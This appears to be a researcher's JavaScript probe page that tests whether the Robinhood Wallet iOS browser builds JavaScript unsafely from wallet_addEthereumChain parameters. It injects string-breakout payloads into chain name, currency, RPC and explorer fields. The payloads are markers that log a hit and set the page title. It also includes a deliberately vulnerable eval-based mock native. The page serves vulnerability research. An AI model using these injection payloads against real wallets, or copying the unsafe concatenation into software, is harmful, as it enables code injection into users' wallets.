// RH-IOS-CHAIN-1 probe: does Robinhood Wallet iOS build JS from wallet_addEthereumChain /
// wallet_switchEthereumChain params without escaping? Marker-only payloads: no reads of
// cookies, storage or wallet data. Researcher's own pages only.
"use strict";

const Q = new URLSearchParams(location.search);
const evidence = { page: location.href, origin: location.origin, ua: navigator.userAgent, events: [], hits: [] };

function log(label, data) {
  const t = new Date().toISOString();
  evidence.events.push({ t, label, data });
  const el = document.getElementById("log");
  if (!el) return;
  const d = document.createElement("div");
  d.className = "entry";
  d.textContent = `[${t.slice(11, 19)}] ${label}${data === undefined ? "" : " " + JSON.stringify(data)}`;
  el.prepend(d);
}

// ---------- marker ----------
// Tag = field*10 + style. Payload expressions contain no quote characters so they stay valid
// inside any of the three string contexts.
const FIELDS = { chainName: 1, currencyName: 2, currencySymbol: 3, rpcUrl: 4, explorerUrl: 5, iconUrl: 6, chainId: 7 };
const STYLES = { dq: 1, sq: 2, bt: 3 };
const tagName = (tag) => {
  const f = Object.keys(FIELDS).find((k) => FIELDS[k] === Math.floor(tag / 10));
  const s = Object.keys(STYLES).find((k) => STYLES[k] === tag % 10);
  return `${f}/${s}`;
};

window.__rhx = function (tag) {
  const hit = { tag, field: tagName(tag), at: location.href, t: new Date().toISOString() };
  evidence.hits.push(hit);
  log(`*** MARKER EXECUTED *** ${hit.field}`, hit);
  const h = document.getElementById("hits");
  if (h) h.textContent = evidence.hits.map((x) => `${x.field} @ ${x.at}`).join("\n");
};

const expr = (tag) => `(window.__rhx?__rhx(${tag}):0,document.title=${tag}+location.host)`;
const breaker = (style, tag) =>
  style === "dq" ? `"+${expr(tag)}+"` : style === "sq" ? `'+${expr(tag)}+'` : "${" + expr(tag) + "}";

// ---------- chains ----------
const CHAINS = {
  sepolia: { chainId: "0xaa36a7", name: "Sepolia", rpc: "https://ethereum-sepolia-rpc.publicnode.com", explorer: "https://sepolia.etherscan.io", symbol: "ETH" },
  gnosis: { chainId: "0x64", name: "Gnosis", rpc: "https://rpc.gnosischain.com", explorer: "https://gnosisscan.io", symbol: "XDAI" },
  base: { chainId: "0x2105", name: "Base", rpc: "https://mainnet.base.org", explorer: "https://basescan.org", symbol: "ETH" },
};

// Payload sits in the URL fragment so the RPC/explorer stay reachable (the fragment is never sent).
function addChainParams(chainKey, style, only) {
  const c = CHAINS[chainKey];
  const inj = (field) => (!only || only === field ? breaker(style, FIELDS[field] * 10 + STYLES[style]) : "");
  const p = {
    chainId: c.chainId + (only === "chainId" ? inj("chainId") : ""),
    chainName: c.name + " Probe" + inj("chainName"),
    nativeCurrency: { name: c.symbol + inj("currencyName"), symbol: c.symbol + inj("currencySymbol"), decimals: 18 },
    rpcUrls: [c.rpc + "/#" + inj("rpcUrl")],
    blockExplorerUrls: [c.explorer + "/#" + inj("explorerUrl")],
    iconUrls: [location.origin + "/icon.png#" + inj("iconUrl")],
  };
  return p;
}

// ---------- provider plumbing ----------
function eth() {
  if (!window.ethereum) throw new Error("window.ethereum not injected");
  return window.ethereum;
}

function hookNativeEvents() {
  const orig = window.invokeEthCallback;
  if (typeof orig !== "function" || orig.__rhxHooked) return !!orig?.__rhxHooked;
  const wrapped = function (e) {
    log("native -> invokeEthCallback", e);
    return orig.apply(this, arguments);
  };
  wrapped.__rhxHooked = true;
  window.invokeEthCallback = wrapped;
  return true;
}

async function rpc(method, params) {
  log(`${method} sent`, params);
  try {
    const r = await eth().request({ method, params });
    log(`${method} resolved`, r);
    return r;
  } catch (e) {
    log(`${method} rejected`, { code: e?.code, message: e?.message ?? String(e) });
  }
}

function surfaces() {
  return {
    ethereum: !!window.ethereum,
    isRobinhoodMobileWallet: !!window.ethereum?.isRobinhoodMobileWallet,
    invokeEthCallback: typeof window.invokeEthCallback,
    rawHandler: !!window.webkit?.messageHandlers?.RHWalletMessageHandler,
    mock: Q.get("mock") || null,
  };
}

function copyEvidence() {
  const s = JSON.stringify(evidence, null, 2);
  navigator.clipboard?.writeText(s).then(() => log("evidence copied"), () => log("clipboard blocked; see console"));
  console.log(s);
}

// ---------- mock natives (?mock=vuln|safe): only to check this page's own logic ----------
// vuln: native concatenates chainName into a dq string (the Zerion #93800 shape).
// safe: native serializes with JSON.stringify.
function installMock(kind) {
  let chainId = "0x1";
  window.invokeEthCallback = (e) => {};
  const emit = (name, arg) => {
    const src = kind === "vuln"
      ? `window.invokeEthCallback({name: "${name}", args: ["${arg}"]})`
      : `window.invokeEthCallback(${JSON.stringify({ name, args: [arg] })})`;
    setTimeout(() => (0, eval)(src), 50);
  };
  window.ethereum = {
    isRobinhoodMobileWallet: true,
    request: async ({ method, params }) => {
      if (method === "eth_requestAccounts") return ["0x000000000000000000000000000000000000dEaD"];
      if (method === "eth_chainId") return chainId;
      if (method === "wallet_addEthereumChain") { chainId = params[0].chainId; emit("chainChanged", params[0].chainName); return null; }
      if (method === "wallet_switchEthereumChain") { emit("chainChanged", params[0].chainId); return null; }
      throw new Error("mock: unsupported " + method);
    },
  };
}
if (Q.get("mock") === "vuln" || Q.get("mock") === "safe") installMock(Q.get("mock"));
